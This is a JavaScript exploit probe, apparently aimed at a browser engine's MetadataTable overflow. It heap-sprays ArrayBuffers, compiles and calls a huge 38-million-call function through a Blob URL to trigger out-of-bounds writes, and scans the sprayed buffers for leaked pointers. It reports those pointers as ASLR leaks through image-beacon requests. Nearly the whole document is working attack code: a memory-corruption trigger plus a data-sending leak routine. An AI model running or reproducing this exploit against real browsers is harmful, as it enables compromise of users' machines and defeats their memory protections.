// p150g — MetadataTable overflow: survive the 4.29GB sweep
//
// p150f was wrong: OOB writes happen in finishCreation() on FIRST CALL,
// not during compilation. This probe actually CALLS the function.
//
// Strategy:
// 1. Spray 400 × 100KB "target" ArrayBuffers (keep alive for reading)
// 2. Spray 2000 × 100KB "padding" ArrayBuffers (free after → MADV_FREE keeps VM mapped)
// 3. Force GC to process frees
// 4. Compile 38M function via Blob URL
// 5. CALL the function → finishCreation sweeps 4.29GB
// 6. If sweep stays in mapped pages → we survive → scan targets
//
// Beacon prefix: V150G-

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V150G-' + tag + '&t=' + Date.now(); } catch(e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function readHex8(view, off) {
    var hex = '';
    for (var h = 7; h >= 0; h--) hex += hexByte(view[off + h]);
    return hex;
  }
  function readU32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT');

  var BUF_SZ = 100096; // same as MetadataTable wrapped size
  var TARGETS = 400;
  var PADDING = 2000;

  // Phase 1: Spray targets (keep alive)
  var targets = [];
  var tViews = [];
  for (var i = 0; i < TARGETS; i++) {
    var ab = new ArrayBuffer(BUF_SZ);
    targets.push(ab);
    tViews.push(new Uint8Array(ab));
  }
  B('TARGETS-' + TARGETS);

  // Phase 2: Spray padding (will free to keep VM mapped)
  var padding = [];
  for (var i = 0; i < PADDING; i++) {
    padding.push(new ArrayBuffer(BUF_SZ));
  }
  B('PADDING-' + PADDING);

  // Phase 3: Free padding → MADV_FREE preserves virtual mapping
  padding = null;
  B('FREED-PADDING');

  // Force GC
  for (var g = 0; g < 5; g++) {
    var junk = [];
    for (var j = 0; j < 20000; j++) junk.push({x: j});
    junk = null;
  }
  B('GC-DONE');

  // Phase 4: Compile 38M function
  var N = 38348816;
  B('BUILD-N' + N);

  var CHUNK = 4000000;
  var nChunks = Math.floor(N / CHUNK);
  var rem = N - nChunks * CHUNK;
  var callChunk = 'a();'.repeat(CHUNK);

  var parts = ['window.__p150fn=function(a){'];
  for (var c = 0; c < nChunks; c++) parts.push(callChunk);
  parts.push('a();'.repeat(rem));
  parts.push('};window.__p150ok=1;');
  callChunk = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  var blobMB = Math.round(blob.size / 1048576);
  B('BLOB-' + blobMB + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { B('SCRIPT-ERR'); };
  sc.onload = function() {
    if (!window.__p150ok) { B('COMPILE-FAIL'); return; }
    B('COMPILED-OK');

    // Phase 5: CALL the function → triggers finishCreation → 4.29GB sweep
    // Callback throws immediately to stop EXECUTION (not compilation sweep)
    // finishCreation runs BEFORE the first bytecode executes
    B('CALLING');

    try {
      window.__p150fn(function() { throw 'STOP'; });
    } catch(e) {
      B('CALL-CAUGHT-' + String(e).substring(0, 20));
    }

    // If we get here, the sweep completed without crashing!
    B('SURVIVED');
    setTimeout(phaseScan, 50);
  };
  document.head.appendChild(sc);
  sc.src = url;

  // Phase 6: Scan targets for OOB writes
  function phaseScan() {
    B('SCAN-START');
    var hitBufs = 0;
    var leaks = [];

    for (var i = 0; i < tViews.length; i++) {
      var view = tViews[i];
      if (!view) continue;

      // Quick check: any non-zero bytes?
      var hasData = false;
      for (var s = 0; s < view.length; s += 112) {
        if (view[s + 12] !== 0 || view[s + 24] !== 0) { hasData = true; break; }
      }
      if (!hasData) continue;

      hitBufs++;

      // Count non-zero bytes
      var nz = 0;
      for (var j = 0; j < view.length; j++) if (view[j]) nz++;

      if (hitBufs <= 5) {
        B('HIT-' + i + '-nz' + nz);

        // Look for thunk addresses at stride 112, offset 24
        var ptrs = 0;
        for (var off = 24; off + 8 <= view.length && ptrs < 3; off += 112) {
          if (view[off] === 0 && view[off+1] === 0 && view[off+2] === 0 && view[off+3] === 0 &&
              view[off+4] === 0 && view[off+5] === 0 && view[off+6] === 0 && view[off+7] === 0) continue;
          var hex = readHex8(view, off);
          B('PTR-' + i + '-O' + off + '=' + hex);
          ptrs++;
          if (leaks.length < 3) leaks.push(hex);
        }

        // Check 0xFFFFFFFF at offset 12
        for (var off = 12; off + 4 <= view.length; off += 112) {
          var v = readU32(view, off);
          if (v === 0xFFFFFFFF) {
            B('FF-' + i + '-O' + off);
            break;
          }
        }
      }
    }

    B('RESULT-hits' + hitBufs + '-leaks' + leaks.length);
    if (leaks.length > 0) {
      B('LEAK-' + leaks[0]);
      // Send full leak data
      for (var l = 0; l < leaks.length; l++) {
        B('ASLR-' + l + '-' + leaks[l]);
      }
    }
    B('DONE');
  }
})();
